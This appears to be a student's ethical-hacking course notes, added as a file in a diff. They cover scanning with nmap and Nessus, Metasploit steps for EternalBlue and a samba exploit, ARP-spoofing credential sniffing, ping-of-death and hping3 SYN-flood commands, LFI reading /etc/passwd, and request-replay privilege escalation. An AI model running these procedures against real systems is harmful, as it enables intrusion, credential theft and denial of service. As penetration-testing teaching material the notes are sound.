@@ -1,0 +1,212 @@
+About Cybersecurity
+Computer security, cybersecurity, or information technology security is the protection of computer systems and networks from information disclosure, theft of or damage to their hardware, software, or electronic data, as well as from the disruption or misdirection of the services they provide.
+Confidentiality, Integrity and Availability are major classes in the Computer Security
+
+
+Steps of hacking
+1.Information gathering: Collecting the Information of the target.
+2.Exploitation: Try to gain at least a command line access on the victim machine.
+3.Privilege escalation: Escalating the privilege from lower level to high level access.
+4.Creating a backdoor: Easy way to enter into the victim machine.
+5.Clearing the tracks: Clear all the tracks or logs captured by the System.
+
+Information Gathering
+Active and Passive way
+1.Active : Gathering the Information directly from the victim and accuracy of info is high but risk is high too.
+ex:-LAN, Server
+2. Passive : Gathering the Information from third party and accuracy of info is low and risk is also low.
+
+Ports
+A port is a virtual point where network connections start and end. Ports are software-based and managed by a computer's operating system. Each port is associated with a specific process or service.
+
+Port Scanning
+It is a process of scanning the ports of a victim machine to get the information about the ports that are running on the device.
+Nmap:- Nmap is a network scanner created by Gordon Lyon. Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection.
+
+Nmap with useful options
+nmap <ip address of a victim machine>  Gives a brief information regarding the open ports.
+nmap -A <ip address of victim machine>  Gives more information regarding the open ports and operating system.
+nmap -sv <ip address of victim machine>  provides the type of service given by the ports.
+nmap -p <victim ip>  specifies the range of open ports
+nmap -T4 -A <victim ip>  A performs all type of port scans and gives complete information.
+
+Vulnerability scanning
+its a process of running an automated vulnerability scanner to identify known vulnerabilities of a system.
+The tool will analyze and provide a detailed vulnerability report of a target.
+
+Nessus:-Nessus is a remote security scanning tool, which scans a computer and raises an alert if it discovers any vulnerabilities that malicious hackers could use to gain access to any computer you have connected to a network.
+
+Steps to scan a victim device.
+1. start the nessus service by entering the command sudo service nessusd start in the command prompt.
+2. open nessus by entering https://127.0.0.1:8834/ in the browser and login using your credentials.
+3. select New Scan ->Basic network Scan->enter necessary details and victim ip address-> launch scan.
+--------------------------------------------------------------------------------------------------
+
+exploitation on a Windows 7 VM using Metasploit.
+steps and commands to compromise the windows7
+1. Open the terminal and initialize msfdb: 
+msfdb init
+2. Start PostgreSQL server:
+service postgresql start
+3. Start the msfconsole:
+msfconsole
+4. search for the vulnerability script:
+search 2017–0143
+5. get more info on the script:
+info exploit/windows/smb/ms17_010_eternalblue
+6. make the msfconsole to use our script
+use exploit/windows/smb/ms17_010_eternalblue
+7. check for available parameters
+options
+8. set the required parameters
+set RHOSTS <victim IP>
+9. Verify if LHOST = attacker IP and RPORT = vulnerable port
+10. lastly we need to run our script:
+exploit
+-------------------------------------------------------------------------
+
+exploitation on a Linux based machine.
+steps and commands to compromise Linux machine
+
+1. msfdb init
+2. service postgresql start
+4. msfconsole
+5. search samba
+6. info exploit/multi/samba/usermap_script
+7. use exploit/multi/samba/usermap_script
+8. show options
+9. exploit
+10. type any linux commands or create directory to test it
+-------------------------------------------------------------------------
+
+Sniffing
+
+
+Its is a process of monitoring and capturing all data packets
+passing through given network. Sniffers are used by network/system
+administrator to monitor and troubleshoot network traffic. Attackers
+use sniffers to capture data packets containing sensitive information
+such as password, account information.
+
+
+Why we use Sniffing
+Sniffers are used by network/system administrator to monitor and
+troubleshoot network traffic
+Sample Sniffing by Capturing the user credentials like username and
+passwords
+
+
+WireShark:Wireshark is a packet sniffer and analysis tool. It captures
+network traffic on the local network and stores that data for offline
+analysis. Wireshark captures network traffic from Ethernet, Bluetooth,
+Wireless (IEEE. 802.11), Token Ring, Frame Relay connections, and
+more.
+
+
+Ettercap: Ettercap is a free and open source network security tool for
+man-in-the-middle attacks on LAN. It can be used for computer
+network protocol analysis and security auditing. It runs on various
+Unix-like operating systems including Linux, Mac OS X, BSD and
+Solaris, and on Microsoft Windows.
+
+GateWay: A computer that sits between different networks or
+applications. The gateway converts information, data or other
+communications from one protocol or format to another. A router may
+perform some of the functions of a gateway.
+
+Steps To perform the sniffing:
+Step 1: Identify the target system and its Gateway
+Step 2 : Open the Wireshark run the ET0 and click to capture the traffic
+Step 3: Open the Ettercap tool and set up the target and gateway by
+scanning the available hosts.
+Step 4: Apply the MIMA Man in middle attack after setuping the target
+Step 5: After this mac address of attacker machine and mac address of
+victim gateways will turn to same. 
+
+type arp -a
+
+
+Step 6: Open any kind of website to give the credentials
+Step 7: open the Wireshark and filter the packets by appropiate
+protocal and request method
+
+type on search bar of wiredshark to get the credentials recorded.
+http&&ip.src==192.168.43.41&&http.request_method=='POST'
+-------------------------------------------------------------------------------------
+
+DOS(Denial Of Service) -1 attacker to 1 server
+DDOS(Distributed Denial Of Service)-Multiple attacker to 1 server attacker{more} = server{less}
+Ping of death-By increasing the size of packet sent in ping
+Command: ping <target-ip> -s <size of the packet> -l (in windows)
+eg: ping <ip_address> -s <packet_size> / -l <packet_size>
+eg: ping 192.168.1.101 -s (unix) 65000
+eg: ping 192.168.1.101 -l (windows) 65000
+ICMP-can be used to block on the servers
+32 or 64 bytes
+600bytes
+Protocol Based
+RFC Standards the waiting period for ACK after sending SYN+ACK 1 min
+1 packets = 1 min
+100 packets = 100 min
+
+Syn flood- continuously sending an only syn requests to the open port
+hping3 -S -p 80 www.goodshopping.com
+
+-----------------------------------------------------------------------------
+
+Web Application Testing Methodology and Information gathering.
+Web Application Testing Methodology:
+1. Collect Information -> Information Gathering
+2. Identify Technologies used
+3. Identify for known Vulnerabilities in the technologies
+4. Various Web pages and their functionality
+5. Run an automated scanner for known issues.
+6. Exploit the vulnerabilities -> Exploitation
+
+Steps for information gathering:
+1. Open the Webpage using the browser and check if anything is fishy
+2. Right-click on the webpage -> View Page Source -> analyze the HTML code / comments to find anything fishy
+3. Open each and every hyperlink on the Webpage using the browser and check if anything is fishy also check the page source.
+4. Use Wappalyzer to find the web technologies used in the server.
+5. Look for hidden webpages in the website using dirt / Web spiders / Crawling
+6. Use any Vulnerability Scanner and look for known vulnerabilities in the application
+
+Types of testing or attackes on web applications 
+Broken Access Control:- (The Web app doesnot differentiate you
+between the roles / permissions)
+You’ll be able to view / access the data which we are not supposed to
+view / access legaly / rightfully
+
+IDOR Indirect Object References :-
+If a object / data is referred with a numerical id or commonly useable
+text(name, number, some common text) so if an unprivileged user tries
+to modify the id, he’ll be able to see it.
+Simple Example on tracking the credentials of the website and testing
+the security of the website using the Burpsuite
+
+
+LFI Local File Inclusions :-
+When apps allow to view certain system files without any restriction, by
+this attack we could access the entire system files.
+Bypass a Path Based Access Control Scheme
+/etc/passwd // Is existing in all unix based machine, it is viewable to all
+users displays the configuration information about user credentials
+
+Privilege Escalation
+Its an attack where one user is able to steal/modify/delete data of
+another user
+Horizontal Escalation:-User is able to edit / access data of a similar
+role user
+Guest : Guest / User : User : Administrator : Administrator
+Vertical Escalation:- User is able to edit / access data of a higher role
+user
+
+Steps to perform Privilege Escalation:-
+1. Login as , perform an unique operation for that profile
+2. Record that request body and keep a backup
+3. Logout from
+4. Login as User 2 (Larry)
+5. Create a dummy request of User 2
+6. Replay the recorded request body by pasting the recorded data
+7. Cross verify if the changes have been madeLogin to and check if the
+changes have been made.
